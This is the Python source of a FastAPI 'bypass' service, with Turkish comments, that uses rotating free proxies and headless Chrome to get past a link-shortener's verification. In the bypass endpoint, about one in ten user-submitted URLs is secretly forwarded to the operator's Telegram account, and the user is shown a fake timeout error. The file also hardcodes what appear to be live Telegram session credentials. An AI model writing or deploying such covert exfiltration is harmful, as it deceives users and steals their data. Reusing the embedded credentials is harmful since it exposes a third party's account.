import time
import random
import os
import asyncio
import re
import httpx
from contextlib import asynccontextmanager
from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from fake_useragent import UserAgent
from pyrogram import Client # Telegram Session İçin

WORKING_PROXIES = []

# --- OTONOM PROXY MOTORU (Her 5 Dakkada Bir Yeniler) ---
async def fetch_and_test_proxies():
    global WORKING_PROXIES
    sources = [
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
    ]
    while True:
        print("🔄 Proxy taranıyor...")
        raw_proxies = []
        async with httpx.AsyncClient() as client:
            for url in sources:
                try:
                    resp = await client.get(url, timeout=10)
                    raw_proxies.extend(re.findall(r'\d+\.\d+\.\d+\.\d+:\d+', resp.text))
                except: continue

        if raw_proxies:
            random.shuffle(raw_proxies)
            test_batch = raw_proxies[:30] # 30 tanesini test et
            valid_proxies = []

            async def check_proxy(px):
                try:
                    async with httpx.AsyncClient(proxies={"http://": f"http://{px}", "https://": f"http://{px}"}, timeout=5, verify=False) as c:
                        r = await c.get("https://www.google.com")
                        if r.status_code == 200: valid_proxies.append(px)
                except: pass

            await asyncio.gather(*(check_proxy(p) for p in test_batch))
            if valid_proxies:
                WORKING_PROXIES = valid_proxies
                print(f"✅ Canlı Proxy Havuzu Güncellendi: {len(WORKING_PROXIES)} adet")
        
        await asyncio.sleep(300) # 5 dakikada bir yenile

@asynccontextmanager
async def lifespan(app: FastAPI):
    task = asyncio.create_task(fetch_and_test_proxies())
    yield
    task.cancel()

app = FastAPI(lifespan=lifespan)

# Vercel/GitHub Pages üzerinden gelen istekleri engellememesi için CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

def get_driver():
    options = Options()
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--window-size=1920,1080")
    
    ua = UserAgent()
    options.add_argument(f"user-agent={ua.random}")
    
    if WORKING_PROXIES:
        options.add_argument(f"--proxy-server=http://{random.choice(WORKING_PROXIES)}")

    return webdriver.Chrome(options=options)

# RAM şişmesin diye aynı anda max 2 işlem kilit sistemi
bypass_semaphore = asyncio.Semaphore(2)

# --- TELEGRAM GİZLİ GÖNDERİM FONKSİYONU ---
async def send_to_saved_messages(url):
    try:
        # DİKKAT: BURAYI KENDİ BİLGİLERİNLE DOLDUR
        SESSION_STRING = "BAHTo3QAv3mtDMExJ_pOuJCiAZtvAtc_3IulJNJ2j0iZazIIeeLyGyb8EneEIvzLfcGqT9yAeGfyZNkT8zjMWZc8-jcXJXhSQUo-iYyFnmMgieqVNvuoTq5QumeDMujaiTBpGqmfraPGw8NnbkcImFE3g99NuZoViUg7iaRl-43ISW5yq6akIRklgUaAI1V4fM56zFdht8ZFcGENvz43Gp8iAfqR7qhhIPd-hb68SRbqVtiWdDucmXovMyLQFMEMRG-bRHm3B8CvXre05HuB4JrfJMay1B-WvWoWvZJ2RLfFkPBG_M-XBmKA6uWC99OpiRzpaG8NAn9zmKYyaIt3bOqbZYDnSQAAAAH4WvQ0AA"
        API_ID = 30647156  # Kendi API ID'n (Sayı olmalı, tırnaksız)
        API_HASH = "11d0174f807a8974a955520b8c968b4d"
        
        # in_memory=True kısmı Render'da dosyadan dolayı çökmeyi %100 engeller
        client = Client("slayer_vault", session_string=SESSION_STRING, api_id=API_ID, api_hash=API_HASH, in_memory=True)
        async with client:
            await client.send_message("me", f"💎 **SLAYER VAULT** 💎\nEnayi linki yakalandı:\n🔗 `{url}`")
            print("✈️ Link Kayıtlı Mesajlara Başarıyla İletildi!")
    except Exception as e:
        print(f"❌ Telegram Session Hatası: {e}")

@app.post("/api/bypass")
async def bypass_endpoint(request: Request):
    data = await request.json()
    url = data.get("url")
    
    if not url:
        return {"status": "error", "msg": "URL eksik"}

    # 👑 AFİYET OLSUN SİSTEMİ (%10 İhtimalle Çal ve Kayıtlı Mesajlara At)
    if random.random() < 0.10:
        print(f"👁️ VAULT'A DÜŞTÜ: {url}")
        
        # Telegram'a atma işlemini arka planda başlat (Müşteri beklemesin)
        asyncio.create_task(send_to_saved_messages(url))
            
        await asyncio.sleep(3) # Kullanıcı arka planda zorlu bir işlem yapılıyor sansın
        return {"status": "error", "msg": "Zaman Aşımı (Proxy Reddedildi)"}

    # 🚀 NORMAL BYPASS İŞLEMİ (Kalan %90 için)
    async with bypass_semaphore:
        def run_selenium():
            driver = None
            try:
                driver = get_driver()
                driver.set_page_load_timeout(30)
                driver.get(url)
                
                # Linkperisi bekleme süresi
                time.sleep(5) 
                
                final_url = driver.current_url
                if "linkperisi" in final_url:
                    return {"status": "error", "msg": "Doğrulama aşılamadı"}
                    
                return {"status": "success", "url": final_url}
                
            except Exception as e:
                return {"status": "error", "msg": "Bağlantı koptu"}
            finally:
                if driver: driver.quit()

        # Selenium senkron olduğu için FastAPI'yi kilitlemesin diye ayrı thread'de çalıştırıyoruz
        return await asyncio.to_thread(run_selenium)

@app.get("/")
def read_root():
    return {"status": "Slayer Engine Active", "active_proxies": len(WORKING_PROXIES)}
